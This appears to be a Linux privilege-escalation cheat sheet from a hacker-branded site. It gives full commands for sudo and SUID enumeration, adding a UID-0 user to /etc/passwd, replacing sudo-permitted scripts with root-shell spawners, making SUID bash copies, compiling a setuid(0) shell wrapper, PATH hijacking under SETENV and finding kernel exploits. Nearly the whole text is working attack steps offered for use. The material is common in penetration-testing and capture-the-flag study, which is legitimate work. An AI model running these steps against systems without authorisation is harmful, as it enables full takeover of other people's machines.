


```
   (  (     what up 
   )  )     hackers 
  .......   enjoy  
  |     |]  the
  \     /   raw
   `---'    turkishcoffee

iamturkishcoffee.com
```

#### manual testing 

1. 7 TRICKS
2. root permission on a file
3. rootbash
4. custom exec
5. path env exploit
#### automated tools #####

1. linpeas
2. lse.sh
3. linenum.sh
4. linux-exploit-suggester-2.pl

## 1. SEVEN TRICKS

```
1 💫💫💫 Gain root privileges if allowed 💫💫💫

sudo su
sudo -i  

2 💫💫💫 List sudo permissions for the current user 💫💫💫

sudo -l  

# What next: Look for "NOPASSWD" or "SETENV" commands. Cross-reference GTFOBins for exploitable binaries/scripts.

3 💫💫💫 Search for SUID binaries 💫💫💫

find / -perm -4000 2>/dev/null  

# What next: Cross-reference results with GTFOBins. Look for exploitable binaries like `find`, `vim`, or `perl`.

4 💫💫💫 Search for SUID and SGID binaries 💫💫💫 

find / -perm -4000 -o -perm -2000 2>/dev/null  

# What next: Same as above, but check SGID binaries for potential access to restricted group resources.

5 💫💫💫 Search for writable files in /etc 💫💫💫

find /etc -writable -type f 2>/dev/null  

# What next: Focus on critical files like `/etc/passwd` or `/etc/sudoers`.
# Modify them directly to escalate privileges or inject a new root user:
# Example: Add a new root user in /etc/passwd

echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd  

6 💫💫💫 Privilege Escalation via Writable Script 💫💫💫

echo "#!/bin/bash" > /path/to/script.sh  
echo "/bin/bash" >> /path/to/script.sh  
chmod +x /path/to/script.sh   
sudo /path/to/script.sh

7 💫💫💫 Kernel Exploit Identification 💫💫💫

uname -a                      
cat /proc/version

# What next: Look for public kernel exploits.
# Use searchsploit to find exploits matching the kernel version:

searchsploit linux kernel <version>  

# Example: searchsploit linux kernel 5.4  
# Download and compile a static binary to ensure compatibility with the target:

gcc -o exploit exploit.c -static  

```

## 2. ROOT PERMISSION ON A FILE

```
# Check sudo permissions for files you can run as root
# Example output:
# (root) NOPASSWD: /opt/wow.sh  

sudo -l  

# Create a malicious script to spawn a root shell

echo -e "#!/bin/bash\n/bin/bash" > /tmp/malicious.sh  
chmod +x /tmp/malicious.sh  

# Replace the target file with your malicious script

sudo mv /tmp/malicious.sh /opt/wow.sh  

# Execute the file to gain a root shell

sudo /opt/wow.sh  
```

## 3. ROOTBASH

```
# Step 1: Copy the Bash binary to a new file named rootbash

cp /bin/bash /tmp/rootbash  

# Step 2: Change the ownership of the file to root

sudo chown root:root /tmp/rootbash  

# Step 3: Set the SUID bit to allow execution with root privileges

sudo chmod u+s /tmp/rootbash  

# Step 4: Verify that the SUID bit is set and ownership is root
# Expected output:
# -rwsr-xr-x 1 root root <size> <date> /tmp/rootbash

ls -l /tmp/rootbash 

# Step 5: Execute the rootbash binary to spawn a root shell
# The -p flag keeps root privileges

/tmp/rootbash -p  

```
## 4. CUSTOM EXEC

```
# Step 1: Create the C file using nano
# Open nano editor to create the custom.c file

nano custom.c  

# Paste this corrected C code inside nano:
# Save and exit (Ctrl+O, Enter, Ctrl+X).

#include <unistd.h> // For setuid
#include <stdlib.h> // For system
int main() {
    setuid(0);
    system("/bin/bash -p");
}

# Step 2: Compile the C code into an executable

gcc -o custom_exec custom.c 

# Step 3: Change the ownership of the executable to root

sudo chown root:root custom_exec  

# Step 4: Add the SUID bit to the executable

sudo chmod u+s custom_exec  

# Step 5: Verify permissions and ownership of the file

ls -l custom_exec  

# Step 6: Execute the custom executable to spawn a root shell

./custom_exec 

```
## 5. PATH ENV EXPLOIT 

```
# Check for sudo permissions and verify if SETENV is allowed

sudo -l

# Look for output like this:
# (root) SETENV: NOPASSWD: /opt/wow.sh
# SETENV allows you to modify environment variables like PATH when running the script.
# Analyze the vulnerable script to identify commands run without full paths

cat /opt/wow.sh

# Look for commands like 'find', 'ls', 'rm', etc., that are not specified with full paths (e.g., /usr/bin/find).

# Create a malicious command to spawn a root shell

echo '#!/bin/bash' > find
echo '/bin/bash' >> find
chmod +x find

# Run the vulnerable script with a modified PATH to prioritize your malicious command

sudo PATH=$PWD:$PATH /opt/wow.sh

```

